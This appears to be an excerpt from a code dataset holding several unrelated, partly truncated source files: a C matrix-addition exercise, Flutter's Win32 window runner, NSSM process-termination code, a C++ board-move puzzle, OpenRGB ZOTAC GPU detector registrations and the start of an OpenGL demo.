for(j=0;j<q;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&a[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\tprintf(\"\u8bf7\u8f93\u5165\u77e9\u9635b\uff08\u8f93\u5165\u65f6\u6bcf\u4e2a\u6570\u7528\u7a7a\u683c\u9694\u5f00,\u8d85\u51fa\u77e9\u9635\u80fd\u5bb9\u7eb3\u7684\u6570\u5c06\u81ea\u52a8\u5ffd\u7565\uff09\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            scanf(\"%f\",&b[i][j]);\r\n\t\t            }\r\n\t            }\r\n\t\t\t\tprintf(\"\u4e24\u4e2a\u77e9\u9635\u76f8\u52a0\u7ed3\u679c\u4e3a\uff1a\\n\");\r\n\t\t\t\tfor(i=0;i<m;i++)\r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            c[i][j]=a[i][j]+b[i][j];//\u76f8\u52a0\u8ba1\u7b97 \r\n\t\t            }\r\n\t            }\r\n\t\t\t\tfor(i=0;i<m;i++)//\u8f93\u51fa \r\n\t            {\r\n\t\t            for(j=0;j<n;j++)\r\n\t\t            {\r\n\t\t\t            printf(\"%.2f\\t\",c[i][j]);\r\n\t\t            }\r\n\t\t            printf(\"\\n\");\r\n\t            }\r\n\t            printf(\"\\n\");\r\n               \t",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"nssm.h\"\r\n\r\nextern imports_t imports;\r\n\r\nHANDLE get_debug_token() {\r\n  long error;\r\n  HANDLE token;\r\n  if (! OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, false, &token)) {\r\n    error = GetLastError();\r\n    if (error == ERROR_NO_TOKEN) {\r\n      (void) ImpersonateSelf(SecurityImpersonation);\r\n      (void) OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, false, &token);\r\n    }\r\n  }\r\n  if (! token) return INVALID_HANDLE_VALUE;\r\n\r\n  TOKEN_PRIVILEGES privileges, old;\r\n  unsigned long size = sizeof(TOKEN_PRIVILEGES);\r\n  LUID luid;\r\n  if (! LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {\r\n    CloseHandle(token);\r\n    return INVALID_HANDLE_VALUE;\r\n  }\r\n\r\n  privileges.PrivilegeCount = 1;\r\n  privileges.Privileges[0].Luid = luid;\r\n  privileges.Privileges[0].Attributes = 0;\r\n\r\n  if (! AdjustTokenPrivileges(token, false, &privileges, size, &old, &size)) {\r\n    CloseHandle(token);\r\n    return INVALID_HANDLE_VALUE;\r\n  }\r\n\r\n  old.PrivilegeCount = 1;\r\n  old.Privileges[0].Luid = luid;\r\n  old.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;\r\n\r\n  if (! AdjustTokenPrivileges(token, false, &old, size, NULL, NULL)) {\r\n    CloseHandle(token);\r\n    return INVALID_HANDLE_VALUE;\r\n  }\r\n\r\n  return token;\r\n}\r\n\r\nvoid service_kill_t(nssm_service_t *service, kill_t *k) {\r\n  if (! service) return;\r\n  if (! k) return;\r\n\r\n  ZeroMemory(k, sizeof(*k));\r\n  k->name = service->name;\r\n  k->process_handle = service->process_handle;\r\n  k->pid = service->pid;\r\n  k->exitcode = service->exitcode;\r\n  k->stop_method = service->stop_method;\r\n  k->kill_console_delay = service->kill_console_delay;\r\n  k->kill_window_delay = service->kill_window_delay;\r\n  k->kill_threads_delay = service->kill_threads_delay;\r\n  k->status_handle = service->status_handle;\r\n  k->status = &service->status;\r\n  k->creation_time = service->creation_time;\r\n  k->exit_time = service->exit_time;\r\n}\r\n\r\nint get_process_creation_time(HANDLE process_handle, FILETIME *ft) {\r\n  FILETIME creation_time, exit_time, kernel_time, user_time;\r\n\r\n  if (! GetProcessTimes(process_handle, &creation_time, &exit_time, &kernel_time, &user_time)) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_GETPROCESSTIMES_FAILED, error_string(GetLastError()), 0);\r\n    return 1;\r\n  }\r\n\r\n  memmove(ft, &creation_time, sizeof(creation_time));\r\n\r\n  return 0;\r\n}\r\n\r\nint get_process_exit_time(HANDLE process_handle, FILETIME *ft) {\r\n  FILETIME creation_time, exit_time, kernel_time, user_time;\r\n\r\n  if (! GetProcessTimes(process_handle, &creation_time, &exit_time, &kernel_time, &user_time)) {\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_GETPROCESSTIMES_FAILED, error_string(GetLastError()), 0);\r\n    return 1;\r\n  }\r\n\r\n  if (! (exit_time.dwLowDateTime || exit_time.dwHighDateTime)) return 2;\r\n  memmove(ft, &exit_time, sizeof(exit_time));\r\n\r\n  return 0;\r\n}\r\n\r\nint check_parent(kill_t *k, PROCESSENTRY32 *pe, unsigned long ppid) {\r\n  /* Check parent process ID matches. */\r\n  if (pe->th32ParentProcessID != ppid) return 1;\r\n\r\n  /*\r\n    Process IDs can be reused so do a sanity check by making sure the child\r\n    has been running for less time than the parent.\r\n    Though unlikely, it's possible that the parent exited and its process ID\r\n    was already reused, so we'll also compare against its exit time.\r\n  */\r\n  HANDLE process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pe->th32ProcessID);\r\n  if (! process_handle) {\r\n    TCHAR pid_string[16];\r\n    _sntprintf_s(pid_string, _countof(pid_string), _TRUNCATE, _T(\"%lu\"), pe->th32ProcessID);\r\n    log_event(EVENTLOG_ERROR_TYPE, NSSM_EVENT_OPENPROCESS_FAILED, pid_string, k->name, error_string(GetLastError()), 0);\r\n    return 2;\r\n  }\r\n\r\n  FILETIME ft;\r\n  if (get_process_creation_time(process_handle, &ft)) {\r\n    CloseHandle(process_handle);\r\n    return 3;\r\n  }\r\n\r\n  CloseHandle(process_handle);\r\n\r\n  /* Verify that the parent's creation time is not later. */\r\n  if (CompareFileTime(&k->creation_time, &ft) > 0) return 4;\r\n\r\n  /* Verify that the parent's exit time is not earlier. */\r\n  if (CompareFileTime(&k->exit_time, &ft) < 0) return 5;\r\n\r\n  return 0;\r\n}\r\n\r\n/* Send some window messages and hope the window respects one or more. */\r\nint CALLBACK kill_window(HWND window, LPARAM arg) {\r\n  kill_t *k = (kill_t *) arg;\r\n\r\n  unsigned long pid;\r\n  if (! GetWindowThreadProcessId(window, &pid)) return 1;\r\n  if (pid != k->pid) return 1;\r\n\r\n  /* First try sending WM_CLOSE to request that the window close. */\r\n  k->signalled |= PostMessage(window, WM_CLOSE, k->exitcode, 0);\r\n\r\n  /*\r\n    Then tell the window that the user is logging off and it should exit\r\n    without worrying about saving any data.\r\n  */\r\n  k->signalled |= PostMessage(window, WM_ENDSESSION, 1, ENDSESSION_CLOSEAPP | ENDSESSION_CRITICAL | ENDSESSION_LOGOFF);\r\n\r\n  return 1;\r\n}\r\n\r\n/*\r\n  Try to post a message to the message queues of threads associated with the\r\n  given process ID.  Not all threads have message queues so there's no\r\n  guarantee of success, and we don't want ",
    "\n#include <iostream>\n#include <string>\n\nusing namespace std;\n\n// \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 isValidMove, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u0442, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043f\u0435\u0440\u0435\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u043f\u043e \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c (x, y)\n// \u0432 \u043f\u0440\u0435\u0434\u0435\u043b\u0430\u0445 \u0434\u043e\u0441\u043a\u0438 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 N x M, \u0438\u0441\u0445\u043e\u0434\u044f \u0438\u0437 \u043d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f move ('L' - \u0432\u043b\u0435\u0432\u043e, 'R' - \u0432\u043f\u0440\u0430\u0432\u043e, 'U' - \u0432\u0432\u0435\u0440\u0445, 'D' - \u0432\u043d\u0438\u0437).\nbool isValidMove(int x, int y, int N, int M, char move) {\n    // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u043c\u043e\u0436\u043d\u043e \u043b\u0438 \u0441\u043e\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043f\u0435\u0440\u0435\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u0432\u043b\u0435\u0432\u043e (move == 'L') \u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 y \u0431\u043e\u043b\u044c\u0448\u0435 1.\n    if (move == 'L' && y > 1) {\n        return true;\n    }\n        // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u043c\u043e\u0436\u043d\u043e \u043b\u0438 \u0441\u043e\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043f\u0435\u0440\u0435\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u0432\u043f\u0440\u0430\u0432\u043e (move == 'R') \u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 y \u043c\u0435\u043d\u044c\u0448\u0435 M.\n    else if (move == 'R' && y < M) {\n        return true;\n    }\n        // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u043c\u043e\u0436\u043d\u043e \u043b\u0438 \u0441\u043e\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043f\u0435\u0440\u0435\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u0432\u0432\u0435\u0440\u0445 (move == 'U') \u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 x \u0431\u043e\u043b\u044c\u0448\u0435 1.\n    else if (move == 'U' && x > 1) {\n        return true;\n    }\n        // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430, \u043c\u043e\u0436\u043d\u043e \u043b\u0438 \u0441\u043e\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u043f\u0435\u0440\u0435\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u0432\u043d\u0438\u0437 (move == 'D') \u0438 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 x \u043c\u0435\u043d\u044c\u0448\u0435 N.\n    else if (move == 'D' && x < N) {\n        return true;\n    }\n    // \u0415\u0441\u043b\u0438 \u043d\u0438 \u043e\u0434\u043d\u043e \u0438\u0437 \u0443\u0441\u043b\u043e\u0432\u0438\u0439 \u043d\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u043b\u043e\u0441\u044c, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044f false.\n    return false;\n}\n\n// \u041e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438 findStartPosition, \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043d\u0430\u0445\u043e\u0434\u0438\u0442 \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u043d\u0430 \u0434\u043e\u0441\u043a\u0435 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 N x M,\n// \u0441 \u0443\u0447\u0435\u0442\u043e\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u043a\u043e\u043c\u0430\u043d\u0434 s.\npair<int, int> findStartPosition(int N, int M, const string& s) {\n    // \u041f\u0440\u043e\u0445\u043e\u0434 \u043f\u043e \u0432\u0441\u0435\u043c \u043a\u043b\u0435\u0442\u043a\u0430\u043c \u0434\u043e\u0441\u043a\u0438.\n    for (int i = 1; i <= N; ++i) {\n        for (int j = 1; j <= M; ++j) {\n            int x = i, y = j; // \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0442\u0435\u043a\u0443\u0449\u0438\u0445 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442.\n            bool valid = true; // \u0424\u043b\u0430\u0433, \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0449\u0438\u0439, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u0442\u0435\u043a\u0443\u0449\u0430\u044f \u043f\u043e\u0437\u0438\u0446\u0438\u044f \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e\u0439.\n            // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043a\u0430\u0436\u0434\u043e\u0439 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0438\u0437 \u0441\u0442\u0440\u043e\u043a\u0438 s.\n            for (char move : s) {\n                // \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u0434\u0432\u0438\u0436\u0435\u043d\u0438\u0435 \u043d\u0435 \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e, \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0444\u043b\u0430\u0433 valid \u0432 false \u0438 \u043f\u0440\u0435\u0440\u044b\u0432\u0430\u0435\u043c \u0446\u0438\u043a\u043b.\n                if (!isValidMove(x, y, N, M, move)) {\n                    valid = false;\n                    break;\n                }\n                // \u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442 \u0432 \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u043d\u043e\u0439 \u043a\u043e\u043c\u0430\u043d\u0434\u043e\u0439.\n                if (move == 'L') y--;\n                else if (move == 'R') y++;\n                else if (move == 'U') x++;\n                else if (move == 'D') x--;\n            }\n            // \u0415\u0441\u043b\u0438 \u0432\u0441\u0435 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u044e\u0442\u0441\u044f \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044f \u0442\u0435\u043a\u0443\u0449\u0430\u044f \u043f\u043e\u0437\u0438\u0446\u0438\u044f.\n            if (valid) {\n                return make_pair(i, j);\n            }\n        }\n    }\n    // \u0415\u0441\u043b\u0438 \u043d\u0438 \u043e\u0434\u043d\u0430 \u043f\u043e\u0437\u0438\u0446\u0438\u044f \u043d\u0435 \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e\u0439, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044f (-1, -1).\n    return make_pair(-1, -1);\n}\n\n// \u041e\u0441\u043d\u043e\u0432\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\nint main() {\n    int N, M; // \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u043e\u0432 \u0434\u043e\u0441\u043a\u0438.\n    string s; // \u0421\u0442\u0440\u043e\u043a\u0430 \u043a\u043e\u043c\u0430\u043d\u0434.\n\n    // \u0412\u044b\u0432\u043e\u0434 \u0437\u0430\u043f\u0440\u043e\u0441\u0430 \u043d\u0430 \u0432\u0432\u043e\u0434 \u0440\u0430\u0437\u043c\u0435\u0440\u043e\u0432 \u0434\u043e\u0441\u043a\u0438.\n    cout << \"Enter size (N M): \";\n    cin >> N >> M;\n    // \u0412\u044b\u0432\u043e\u0434 \u0437\u0430\u043f\u0440\u043e\u0441\u0430 \u043d\u0430 \u0432\u0432\u043e\u0434 \u0441\u0442\u0440\u043e\u043a\u0438 \u043a\u043e\u043c\u0430\u043d\u0434.\n    cout << \"Enter string of commands: \";\n    cin >> s;\n\n    // \u041d\u0430\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u043d\u0430 \u0434\u043e\u0441\u043a\u0435 \u0441 \u0443\u0447\u0435\u0442\u043e\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u043a\u043e\u043c\u0430\u043d\u0434.\n    pair<int, int> startPos = findStartPosition(N, M, s);\n\n    // \u0412\u044b\u0432\u043e\u0434 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430: \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 \u0438\u043b\u0438 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f \u043e \u043d\u0435\u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0432\u0441\u0435\u0445 \u043a\u043e\u043c\u0430\u043d\u0434.\n    if (startPos.first == -1 && startPos.second == -1) {\n        cout << \"It is impossible to complete all commands without leaving the board.\\n\";\n    } else {\n        cout << \"Result: (\" << startPos.first << \",\" << startPos.second << \")\\n\";\n    }\n\n    return 0;\n}\n\n",
    "#include \"Detector.h\"\n#include \"ZotacV2GPUController.h\"\n#include \"RGBController.h\"\n#include \"RGBController_ZotacV2GPU.h\"\n#include \"i2c_smbus.h\"\n#include \"pci_ids.h\"\n#include \"LogManager.h\"\n\n/******************************************************************************************\\\n*                                                                                          *\n*   DetectZotacV2GPUControllers                                                            *\n*                                                                                          *\n*       Detect ZOTAC 30/40 series RGB controllers on the enumerated I2C busses             *\n*       at address 0x49.                                                                   *\n*                                                                                          *\n*           bus - pointer to i2c_smbus_interface where RGB device is connected             *\n*           dev - I2C address of RGB device                                                *\n*                                                                                          *\n\\******************************************************************************************/\n\nvoid DetectZotacV2GPUControllers(i2c_smbus_interface* bus, u8 i2c_addr, const std::string& name)\n{\n    u8 rdata_pkt[I2C_SMBUS_BLOCK_MAX] = { 0x00 };\n    int rdata_len = sizeof(rdata_pkt);\n    if(bus->i2c_read_block(i2c_addr, &rdata_len, rdata_pkt) >= 0)\n    {\n        ZotacV2GPUController*     controller     = new ZotacV2GPUController(bus, i2c_addr);\n        RGBController_ZotacV2GPU* rgb_controller = new RGBController_ZotacV2GPU(controller);\n        rgb_controller->name                     = name;\n\n        if(rgb_controller->config.numberOfZones > 0)\n        {\n            ResourceManager::get()->RegisterRGBController(rgb_controller);\n        }\n        else\n        {\n            LOG_ERROR(\"[%s] RGB controller not registered.\", name.c_str());\n        }\n    }\n}\n\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3070 Ti\",                     DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3070TI_GA102_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3070TI_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3070 Ti Trinity OC\",          DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3070TI_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3070TI_TRINITY_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3080 Trinity OC LHR 12GB\",    DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3080_12G_LHR_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3080_12G_LHR_TRINITY_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3080 Trinity LHR\",            DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3080_LHR_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3080_LHR_TRINITY_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3080 Ti AMP Holo\",            DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3080TI_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3080TI_AMP_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3090 AMP Extreme Holo\",       DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3090_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3090_AMP_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 3090 Trinity\",                DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX3090_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX3090_TRINITY_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 4070 Ti Trinity OC\",          DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX4070TI_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX4070TI_TRINITY_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 4080 16GB AMP Extreme AIRO\",  DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX4080_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX4080_AMP_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 4090 Trinity OC\",             DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX4090_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX4090_TRINITY_SUB_DEV, 0x49);\nREGISTER_I2C_PCI_DETECTOR(\"ZOTAC GAMING GeForce RTX 4090 AMP Extreme AIRO\",       DetectZotacV2GPUControllers, NVIDIA_VEN, NVIDIA_RTX4090_DEV, ZOTAC_SUB_VEN, ZOTAC_RTX4090_AMP_SUB_DEV, 0x49);\n",
    "\ufeff///// main.cpp\n///// OpenGL 3+, GLSL 1.20, GLEW, GLFW3\n\n#include <GL/glew.h>\n#include <GLFW/glfw3.h>\n\n#include <iostream>\n#include <string>\n#include <fstream>\n#include <cassert>\n\n////////////////////////////////////////////////////////////////////////////////\n/// \uc250\uc774\ub354 \uad00\ub828 \ubcc0\uc218 \ubc0f \ud568\uc218\n////////////////////////////////////////////////////////////////////////////////\nGLuint  program;          // \uc250\uc774\ub354 \ud504\ub85c\uadf8\ub7a8 \uac1d\uccb4\uc758 \ub808\ud37c\ub7f0\uc2a4 \uac12\nGLint   loc_a_position;   // attribute \ubcc0\uc218 a_position \uc704\uce58\nGLint   loc_a_color;      // attribute \ubcc0\uc218 a_color \uc704\uce58\nGLint   loc_u_PVM;        // uniform \ubcc0\uc218 u_PVM \uc704\uce58\n\nGLuint create_shader_from_file(const std::string& filename, GLuint shader_type);\nvoid init_shader_program();\n////////////////////////////////////////////////////////////////////////////////\n\n\n////////////////////////////////////////////////////////////////////////////////\n/// \ub80c\ub354\ub9c1 \uad00\ub828 \ubcc0\uc218 \ubc0f \ud568\uc218\n////////////////////////////////////////////////////////////////////////////////\n// per-vertex 3D positions (x, y, z)\nGLfloat g_position[] = {\n  0.5f,  0.5f,  0.0f,          // 0th vertex position\n  -0.5f, -0.5f,  0.0f,          // 1st vertex position\n  0.5f, -0.5f,  0.0f,          // 2nd vertex position\n\n  0.5f,  0.5f,  0.0f,          // 3rd vertex position\n  -0.5f, 0.5f,  0.0f,          // 4th vertex position\n  -0.5f, -0.5f,  0.0f,          // 5th vertex position  \n};\n\n// per-vertex RGB color (r, g, b)\nGLfloat g_color[] = {\n  1.0f, 0.0f, 0.0f,             // 0th vertex color (red)\n  0.0f, 1.0f, 0.0f,             // 1st vertex color (green)\n  0.0f, 0.0f, 1.0f,             // 2nd vertex color (blue)\n\n  1.0f, 0.0f, 0.0f,             // 3rd vertex color (red)\n  1.0f, 1.0f, 0.0f,             // 4th vertex color (yellow)\n  0.0f, 1.0f, 0.0f,             // 5th vertex color (green)\n};\n\nvoid render_object();           // rendering \ud568\uc218: \ubb3c\uccb4(\uc0bc\uac01\ud615)\ub97c \ub80c\ub354\ub9c1\ud558\ub294 \ud568\uc218.\n////////////////////////////////////////////////////////////////////////////////\n\n\n// GLSL \ud30c\uc77c\uc744 \uc77d\uc5b4\uc11c \ucef4\ud30c\uc77c\ud55c \ud6c4 \uc250\uc774\ub354 \uac1d\uccb4\ub97c 